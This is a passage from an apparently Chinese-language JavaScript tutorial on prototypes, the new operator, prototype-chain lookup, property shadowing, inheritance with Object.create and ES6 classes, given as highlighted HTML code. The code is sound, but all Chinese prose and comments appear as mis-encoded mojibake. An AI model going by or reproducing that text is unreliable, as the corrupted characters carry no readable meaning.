<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car1.<span class="hljs-property">start</span> === car2.<span class="hljs-property">start</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>è¿™å°±æ˜¯åŸå‹çš„æ ¸å¿ƒä»·å€¼ï¼š<strong>æ–¹æ³•åªéœ€è¦å®šä¹‰ä¸€æ¬¡ï¼Œæ‰€æœ‰å®ä¾‹éƒ½èƒ½ç”¨</strong>ã€‚</p>
<p>å¦‚æœæŠŠæ–¹æ³•å®šä¹‰åœ¨æ„é€ å‡½æ•°é‡Œï¼Œæ¯åˆ›å»ºä¸€ä¸ªå®ä¾‹å°±ä¼šæ–°å»ºä¸€ä¸ªå‡½æ•°ï¼Œæµªè´¹å†…å­˜ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¸æ¨èçš„å†™æ³•</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">BadCar</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">start</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {  <span class="hljs-comment">// æ¯ä¸ªå®ä¾‹éƒ½æœ‰ä¸€ä»½</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.brand}</span> å¯åŠ¨äº†`</span>);
  };
}

<span class="hljs-keyword">const</span> bad1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadCar</span>(<span class="hljs-string">'ä¸°ç”°'</span>);
<span class="hljs-keyword">const</span> bad2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadCar</span>(<span class="hljs-string">'æœ¬ç”°'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(bad1.<span class="hljs-property">start</span> === bad2.<span class="hljs-property">start</span>); <span class="hljs-comment">// falseï¼Œä¸¤ä¸ªä¸åŒçš„å‡½æ•°</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">new å…³é”®å­—åˆ°åº•åšäº†ä»€ä¹ˆ</h3>
<p>ç†è§£åŸå‹é“¾ä¹‹å‰ï¼Œå¾—å…ˆææ¸…æ¥š <code>new</code> çš„å·¥ä½œåŸç†ã€‚å½“ä½ å†™ <code>new Foo()</code> æ—¶ï¼ŒJavaScript å¼•æ“ä¼šæ‰§è¡Œä»¥ä¸‹å››ä¸ªæ­¥éª¤ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A['1. åˆ›å»ºç©ºå¯¹è±¡']:::step --&gt; B['2. è®¾ç½®åŸå‹é“¾']:::step
    B --&gt; C['3. æ‰§è¡Œæ„é€ å‡½æ•°']:::step
    C --&gt; D['4. è¿”å›å¯¹è±¡']:::success

    classDef step fill:#cce5ff,stroke:#0d6efd,color:#004085
    classDef success fill:#d4edda,stroke:#28a745,color:#155724
</code></pre>
<h4 data-id="heading-6">è¯¦ç»†æ­¥éª¤</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};

<span class="hljs-keyword">const</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'John'</span>);
</code></pre>
<p><strong>Step 1ï¼šåˆ›å»ºä¸€ä¸ªç©ºå¯¹è±¡</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å†…éƒ¨åˆ›å»ºï¼š{}</span>
</code></pre>
<p><strong>Step 2ï¼šå°†ç©ºå¯¹è±¡çš„ <code>[[Prototype]]</code> æŒ‡å‘æ„é€ å‡½æ•°çš„ <code>prototype</code></strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å†…éƒ¨æ“ä½œï¼šnewObj.__proto__ = Person.prototype</span>
</code></pre>
<p><strong>Step 3ï¼šç”¨è¿™ä¸ªç©ºå¯¹è±¡ä½œä¸º <code>this</code> æ‰§è¡Œæ„é€ å‡½æ•°</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å†…éƒ¨æ“ä½œï¼šPerson.call(newObj, 'John')</span>
<span class="hljs-comment">// æ‰§è¡Œå newObj å˜æˆ { name: 'John' }</span>
</code></pre>
<p><strong>Step 4ï¼šè¿”å›å¯¹è±¡</strong></p>
<ul>
<li>å¦‚æœæ„é€ å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ç”¨é‚£ä¸ªå¯¹è±¡</li>
<li>å¦åˆ™è¿”å› Step 1 åˆ›å»ºçš„å¯¹è±¡</li>
</ul>
<h4 data-id="heading-7">æ‰‹å†™ä¸€ä¸ª new</h4>
<p>ç†è§£äº†åŸç†ï¼Œå¯ä»¥è‡ªå·±å®ç°ä¸€ä¸ªï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">Constructor, ...args</span>) {
  <span class="hljs-comment">// 1. åˆ›å»ºç©ºå¯¹è±¡ï¼ŒåŸå‹æŒ‡å‘æ„é€ å‡½æ•°çš„ prototype</span>
  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

  <span class="hljs-comment">// 2. æ‰§è¡Œæ„é€ å‡½æ•°ï¼Œthis ç»‘å®šåˆ°æ–°å¯¹è±¡</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);

  <span class="hljs-comment">// 3. å¦‚æœæ„é€ å‡½æ•°è¿”å›å¯¹è±¡ï¼Œå°±ç”¨å®ƒï¼›å¦åˆ™ç”¨æ–°åˆ›å»ºçš„å¯¹è±¡</span>
  <span class="hljs-keyword">return</span> result <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span> ? result : obj;
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">const</span> p = <span class="hljs-title function_">myNew</span>(<span class="hljs-title class_">Person</span>, <span class="hljs-string">'Alice'</span>);
p.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// Hi, I'm Alice</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span>
</code></pre>
<hr/>
<h3 data-id="heading-8">åŸå‹é“¾çš„æŸ¥æ‰¾æœºåˆ¶</h3>
<p>å½“è®¿é—®å¯¹è±¡çš„å±æ€§æˆ–æ–¹æ³•æ—¶ï¼ŒJavaScript ä¼šæŒ‰ç…§è¿™ä¸ªé¡ºåºæŸ¥æ‰¾ï¼š</p>
<ol>
<li>å…ˆåœ¨å¯¹è±¡è‡ªèº«æ‰¾</li>
<li>æ‰¾ä¸åˆ°ï¼Œå»å¯¹è±¡çš„åŸå‹ (<code>__proto__</code>) ä¸Šæ‰¾</li>
<li>è¿˜æ‰¾ä¸åˆ°ï¼Œç»§ç»­å¾€ä¸Šä¸€çº§åŸå‹æ‰¾</li>
<li>ç›´åˆ° <code>Object.prototype</code>ï¼Œå†å¾€ä¸Šå°±æ˜¯ <code>null</code> äº†</li>
</ol>
<p>è¿™æ¡æŸ¥æ‰¾é“¾è·¯å°±æ˜¯<strong>åŸå‹é“¾</strong>ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    A["dog å®ä¾‹&lt;br/&gt;{ name: 'Buddy' }"]:::instance --&gt;|__proto__| B["Dog.prototype&lt;br/&gt;{ bark: Æ’ }"]:::proto
    B --&gt;|__proto__| C["Animal.prototype&lt;br/&gt;{ speak: Æ’ }"]:::proto
    C --&gt;|__proto__| D["Object.prototype&lt;br/&gt;{ toString: Æ’, ... }"]:::rootProto
    D --&gt;|__proto__| E["null"]:::endNode

    classDef instance fill:#cce5ff,stroke:#0d6efd,color:#004085
    classDef proto fill:#d4edda,stroke:#28a745,color:#155724
    classDef rootProto fill:#fff3cd,stroke:#ffc107,color:#856404
    classDef endNode fill:#f8d7da,stroke:#dc3545,color:#721c24
</code></pre>
<h4 data-id="heading-9">ä»£ç ç¤ºä¾‹</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> makes a sound`</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
}

<span class="hljs-comment">// å»ºç«‹åŸå‹é“¾ï¼šDog.prototype -&gt; Animal.prototype</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;

<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">bark</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Woof!'</span>);
};

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'Buddy'</span>);

<span class="hljs-comment">// æŸ¥æ‰¾è¿‡ç¨‹ï¼š</span>
dog.<span class="hljs-property">name</span>;    <span class="hljs-comment">// åœ¨ dog è‡ªèº«æ‰¾åˆ°</span>
dog.<span class="hljs-title function_">bark</span>();  <span class="hljs-comment">// åœ¨ Dog.prototype æ‰¾åˆ°</span>
dog.<span class="hljs-title function_">speak</span>(); <span class="hljs-comment">// åœ¨ Animal.prototype æ‰¾åˆ°</span>
dog.<span class="hljs-title function_">toString</span>(); <span class="hljs-comment">// åœ¨ Object.prototype æ‰¾åˆ°</span>
</code></pre>
<p>ç”¨ä»£ç éªŒè¯è¿™æ¡é“¾ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);                 <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);    <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-literal">null</span>);             <span class="hljs-comment">// true</span>
</code></pre>
<p>è¿™å°±è§£é‡Šäº†å¼€å¤´çš„é—®é¢˜ã€‚æ•°ç»„èƒ½è°ƒç”¨ <code>push</code>ã€<code>join</code>ï¼Œæ˜¯å› ä¸ºè¿™äº›æ–¹æ³•å®šä¹‰åœ¨ <code>Array.prototype</code> ä¸Šã€‚èƒ½è°ƒç”¨ <code>toString</code>ï¼Œæ˜¯å› ä¸ºé¡ºç€åŸå‹é“¾èƒ½æ‰¾åˆ° <code>Object.prototype.toString</code>ï¼ˆè™½ç„¶ Array é‡å†™äº†è¿™ä¸ªæ–¹æ³•ï¼‰ã€‚</p>
<hr/>
<h3 data-id="heading-10">å®Œæ•´çš„åŸå‹é“¾å›¾è°±</h3>
<p>JavaScript çš„åŸå‹é“¾æ¯”æƒ³è±¡ä¸­æ›´å¤æ‚ï¼Œå‡½æ•°æœ¬èº«ä¹Ÿæ˜¯å¯¹è±¡ï¼Œä¹Ÿæœ‰è‡ªå·±çš„åŸå‹é“¾ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph IL[å®ä¾‹å±‚]
        foo["foo å®ä¾‹"]:::instance
    end

    subgraph PL[åŸå‹å±‚]
        FooP["Foo.prototype"]:::proto
        ObjP["Object.prototype"]:::rootProto
    end

    subgraph FL[å‡½æ•°å±‚]
        Foo["Foo å‡½æ•°"]:::func
        Obj["Object å‡½æ•°"]:::func
        Func["Function å‡½æ•°"]:::func
    end

    subgraph FPL[å‡½æ•°åŸå‹å±‚]
        FuncP["Function.prototype"]:::funcProto
    end

    foo --&gt;|__proto__| FooP
    FooP --&gt;|__proto__| ObjP
    ObjP --&gt;|__proto__| NULL["null"]:::endNode

    Foo --&gt;|prototype| FooP
    Foo --&gt;|__proto__| FuncP

    Obj --&gt;|prototype| ObjP
    Obj --&gt;|__proto__| FuncP

    Func --&gt;|prototype| FuncP
    Func --&gt;|__proto__| FuncP

    FuncP --&gt;|__proto__| ObjP

    classDef instance fill:#cce5ff,stroke:#0d6efd,color:#004085
    classDef proto fill:#d4edda,stroke:#28a745,color:#155724
    classDef rootProto fill:#fff3cd,stroke:#ffc107,color:#856404
    classDef func fill:#e2d9f3,stroke:#6f42c1,color:#432874
    classDef funcProto fill:#fce4ec,stroke:#e91e63,color:#880e4f
    classDef endNode fill:#f8d7da,stroke:#dc3545,color:#721c24

    style IL fill:#e8f4fc,stroke:#0d6efd
    style PL fill:#e8f5e9,stroke:#28a745
    style FL fill:#f3e5f5,stroke:#6f42c1
    style FPL fill:#fce4ec,stroke:#e91e63
</code></pre>
<h4 data-id="heading-11">å‡ ä¸ªå…³é”®ç‚¹</h4>
<p><strong>1. æ‰€æœ‰å‡½æ•°éƒ½æ˜¯ Function çš„å®ä¾‹</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Foo</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);    <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Function</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// trueï¼ˆè‡ªå·±åˆ›å»ºè‡ªå·±ï¼‰</span>
</code></pre>
<p><strong>2. Function.prototype ä¹Ÿæ˜¯å¯¹è±¡ï¼Œå®ƒçš„åŸå‹æ˜¯ Object.prototype</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
</code></pre>
<p><strong>3. Object.prototype æ˜¯åŸå‹é“¾çš„ç»ˆç‚¹</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-literal">null</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p><strong>4. ä¸€ä¸ªæœ‰è¶£çš„å¾ªç¯</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Object æ˜¯å‡½æ•°ï¼Œæ‰€ä»¥å®ƒçš„ __proto__ æ˜¯ Function.prototype</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// Function.prototype æ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥å®ƒçš„ __proto__ æ˜¯ Object.prototype</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// è¿™å½¢æˆäº†ä¸€ä¸ªæœ‰è¶£çš„"é¸¡ç”Ÿè›‹è›‹ç”Ÿé¸¡"çš„å…³ç³»</span>
</code></pre>
<hr/>
<h3 data-id="heading-12">å±æ€§é®è”½ï¼ˆProperty Shadowingï¼‰</h3>
<p>å¦‚æœå¯¹è±¡è‡ªèº«å’ŒåŸå‹ä¸Šæœ‰åŒåå±æ€§ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">name</span> = <span class="hljs-string">'Default'</span>;
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};

<span class="hljs-keyword">const</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'John'</span>);

<span class="hljs-comment">// è‡ªèº«å±æ€§é®è”½åŸå‹å±æ€§</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">name</span>); <span class="hljs-comment">// 'John'ï¼Œä¸æ˜¯ 'Default'</span>

<span class="hljs-comment">// åˆ é™¤è‡ªèº«å±æ€§åï¼ŒåŸå‹å±æ€§å°±éœ²å‡ºæ¥äº†</span>
<span class="hljs-keyword">delete</span> john.<span class="hljs-property">name</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">name</span>); <span class="hljs-comment">// 'Default'</span>
</code></pre>
<p>è¿™å°±æ˜¯<strong>å±æ€§é®è”½</strong>ï¼šè‡ªèº«å±æ€§ä¼š"é®ä½"åŸå‹é“¾ä¸Šçš„åŒåå±æ€§ã€‚</p>
<h4 data-id="heading-13">æ£€æŸ¥å±æ€§æ¥æº</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'John'</span>);

<span class="hljs-comment">// hasOwnProperty åªæ£€æŸ¥è‡ªèº«å±æ€§</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'name'</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-title function_">hasOwnProperty</span>(<span class="hljs-string">'greet'</span>)); <span class="hljs-comment">// false</span>

<span class="hljs-comment">// in æ“ä½œç¬¦æ£€æŸ¥æ•´ä¸ªåŸå‹é“¾</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'name'</span> <span class="hljs-keyword">in</span> john);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'greet'</span> <span class="hljs-keyword">in</span> john); <span class="hljs-comment">// true</span>
</code></pre>
<hr/>
<h3 data-id="heading-14">å®ç°ç»§æ‰¿</h3>
<p>ç†è§£äº†åŸå‹é“¾ï¼Œç»§æ‰¿å°±å¥½åŠäº†ã€‚æ ¸å¿ƒå°±ä¸¤æ­¥ï¼š</p>
<ol>
<li>è°ƒç”¨çˆ¶æ„é€ å‡½æ•°ï¼Œç»§æ‰¿å®ä¾‹å±æ€§</li>
<li>è®¾ç½®åŸå‹é“¾ï¼Œç»§æ‰¿åŸå‹æ–¹æ³•</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Vehicle</span>(<span class="hljs-params">type</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span> = <span class="hljs-number">0</span>;
}

<span class="hljs-title class_">Vehicle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">accelerate</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">amount</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span> += amount;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.type}</span> åŠ é€Ÿåˆ° <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.speed}</span> km/h`</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-title class_">Vehicle</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">'æ±½è½¦'</span>);  <span class="hljs-comment">// ç»§æ‰¿å®ä¾‹å±æ€§</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
}

<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Vehicle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// ç»§æ‰¿åŸå‹æ–¹æ³•</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Car</span>;

<span class="hljs-comment">// æ·»åŠ å­ç±»ç‰¹æœ‰çš„æ–¹æ³•</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">honk</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.brand}</span> é¸£ç¬›`</span>);
};

<span class="hljs-comment">// é‡å†™çˆ¶ç±»æ–¹æ³•</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">accelerate</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">amount</span>) {
  <span class="hljs-title class_">Vehicle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">accelerate</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, amount);
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span> &gt; <span class="hljs-number">120</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¶…é€Ÿè­¦å‘Š'</span>);
  }
};

<span class="hljs-keyword">const</span> myCar = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">'ä¸°ç”°'</span>);
myCar.<span class="hljs-title function_">accelerate</span>(<span class="hljs-number">50</span>);   <span class="hljs-comment">// æ±½è½¦ åŠ é€Ÿåˆ° 50 km/h</span>
myCar.<span class="hljs-title function_">accelerate</span>(<span class="hljs-number">80</span>);   <span class="hljs-comment">// æ±½è½¦ åŠ é€Ÿåˆ° 130 km/h</span>
                        <span class="hljs-comment">// è¶…é€Ÿè­¦å‘Š</span>
myCar.<span class="hljs-title function_">honk</span>();           <span class="hljs-comment">// ä¸°ç”° é¸£ç¬›</span>
</code></pre>
<h4 data-id="heading-15">ä¸ºä»€ä¹ˆç”¨ Object.create() è€Œä¸æ˜¯ç›´æ¥èµ‹å€¼</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é”™è¯¯å†™æ³•</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Vehicle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
<span class="hljs-comment">// é—®é¢˜ï¼šä¿®æ”¹ Car.prototype ä¼šå½±å“ Vehicle.prototype</span>

<span class="hljs-comment">// é”™è¯¯å†™æ³•</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vehicle</span>();
<span class="hljs-comment">// é—®é¢˜ï¼šä¼šæ‰§è¡Œ Vehicle æ„é€ å‡½æ•°ï¼Œå¯èƒ½æœ‰å‰¯ä½œç”¨</span>

<span class="hljs-comment">// æ­£ç¡®å†™æ³•</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Vehicle</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°å¯¹è±¡ï¼ŒåŸå‹æŒ‡å‘ Vehicle.prototype</span>
</code></pre>
<hr/>
<h3 data-id="heading-16">ES6 çš„ class è¯­æ³•</h3>
<p>ES6 å¼•å…¥äº† <code>class</code> å…³é”®å­—ï¼Œå†™èµ·æ¥æ›´æ¸…çˆ½ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> makes a sound`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, breed</span>) {
    <span class="hljs-variable language_">super</span>(name);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;
  }

  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Woof!'</span>);
  }
}

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'Buddy'</span>, <span class="hljs-string">'Labrador'</span>);
dog.<span class="hljs-title function_">speak</span>(); <span class="hljs-comment">// Buddy makes a sound</span>
dog.<span class="hljs-title function_">bark</span>();  <span class="hljs-comment">// Woof!</span>
</code></pre>
<p>ä½†è¦æ¸…æ¥šï¼Œ<code>class</code> åªæ˜¯è¯­æ³•ç³–ï¼Œåº•å±‚è¿˜æ˜¯åŸå‹é“¾é‚£å¥—ï¼š</p>
